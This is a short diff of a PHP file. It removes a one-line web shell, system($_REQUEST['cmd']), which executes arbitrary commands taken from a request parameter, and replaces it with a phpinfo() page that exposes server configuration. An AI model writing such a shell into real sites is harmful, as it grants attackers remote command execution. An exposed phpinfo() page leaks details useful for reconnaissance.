@@ -1,1 +1,5 @@
-<? system($_REQUEST['cmd']); ?>
+<?
+
+phpinfo();
+
+?>
